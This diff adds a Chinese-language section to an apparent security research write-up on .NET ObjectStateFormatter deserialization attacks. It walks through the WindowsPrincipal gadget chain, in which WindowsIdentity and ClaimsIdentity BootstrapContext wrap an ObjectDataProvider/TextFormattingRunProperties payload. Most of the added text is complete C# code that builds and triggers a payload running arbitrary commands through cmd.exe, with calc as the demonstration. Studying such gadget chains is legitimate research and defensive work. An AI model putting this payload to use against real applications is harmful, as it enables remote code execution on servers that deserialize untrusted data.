@@ -147,3 +147,140 @@ namespace ObjectStateFormatterSerialize
 
 运行后弹出calc。
 
+## WindowsPrincipal
+
+对于WindowsPrincipal的构造就两行代码
+
+![image-20210507105715422](ObjectStateFormatter.assets/image-20210507105715422.png)
+
+在generate的时候
+
+![image-20210507110155824](ObjectStateFormatter.assets/image-20210507110155824.png)
+
+新建了一个WindowsIdentity实例，其Actor字段的BootstrapContext值赋值为TextFormattingRunPropertiesGadget的payload。看到BootstrapContext就知道是ClaimsIdentity gadget的又一次利用。自己构造payload
+
+```csharp
+using Microsoft.VisualStudio.Text.Formatting;
+using System;
+using System.Collections.Specialized;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.Serialization;
+using System.Security.Claims;
+using System.Security.Principal;
+using System.Web.UI;
+using System.Windows.Data;
+using System.Windows.Markup;
+
+namespace ObjectStateFormatterSerialize
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
+            currentWI.Actor = new ClaimsIdentity();
+            currentWI.Actor.BootstrapContext = new TextFormattingRunPropertiesMarshal("calc");
+            WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
+            obj.wi = currentWI;
+            string v = new ObjectStateFormatter().Serialize(obj);
+            new ObjectStateFormatter().Deserialize(v);
+        }
+
+
+    }
+    [Serializable]
+    public class WindowsPrincipalMarshal : ISerializable
+    {
+        public WindowsPrincipalMarshal() { }
+        public WindowsIdentity wi { get; set; }
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsPrincipal));
+            info.AddValue("m_identity", wi);
+        }
+    }
+
+    [Serializable]
+    public class TextFormattingRunPropertiesMarshal : ISerializable
+    {
+        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
+        {
+        }
+        string _xaml;
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            Type typeTFRP = typeof(TextFormattingRunProperties);
+            info.SetType(typeTFRP);
+            info.AddValue("ForegroundBrush", _xaml);
+        }
+        public TextFormattingRunPropertiesMarshal(string cmd)
+        {
+            // ObjectDataProvider
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "cmd.exe";
+            psi.Arguments = $"/c {cmd}";
+            StringDictionary dict = new StringDictionary();
+            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
+            Process p = new Process();
+            p.StartInfo = psi;
+            ObjectDataProvider odp = new ObjectDataProvider();
+            odp.MethodName = "Start";
+            odp.IsInitialLoadEnabled = false;
+            odp.ObjectInstance = p;
+            _xaml = XamlWriter.Save(odp);
+        }
+    }
+}
+```
+
+WindowsPrincipal类有一个字段类型为WindowsIdentity
+
+![image-20210508091951491](ObjectStateFormatter.assets/image-20210508091951491.png)
+
+而前文中讲过WindowsIdentity的bootstrapContext字段可反序列化RCE。所以payload构造可以更简单些：
+
+```csharp
+class Program
+{
+    static void Main(string[] args)
+    {
+        WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
+        currentWI.BootstrapContext= new TextFormattingRunPropertiesMarshal("calc");
+        WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
+        obj.wi = currentWI;
+        string v = new ObjectStateFormatter().Serialize(obj);
+        new ObjectStateFormatter().Deserialize(v);
+    }
+}
+```
+
+
+
+堆栈
+
+![image-20210508092544937](ObjectStateFormatter.assets/image-20210508092544937.png)
+
+可见在反序列化重建对象时，填充类型为WindowsIdentity的m_identity字段时触发了其父类的反序列化，从而反序列化bootstrapContext。
+
+在GetObjectData中
+
+```csharp
+[Serializable]
+public class WindowsPrincipalMarshal : ISerializable
+{
+    public WindowsPrincipalMarshal() { }
+    public WindowsIdentity wi { get; set; }
+    public void GetObjectData(SerializationInfo info, StreamingContext context)
+    {
+        info.SetType(typeof(WindowsPrincipal));
+        info.AddValue("m_identity", wi);
+    }
+}
+```
+
+m_identity可以改成随便的字符串，因为在info中，value对象被序列化存储，在反序列化时，info重建其value会自动反序列化。
+
+# 后文
+
+本文讲解了RolePrincipal、WindowsPrincipal攻击链。RolePrincipal是对ClaimsPrincipal的继承利用，WindowsPrincipal是套娃WindowsIdentity，本质还是通过ClaimsIdentity利用。
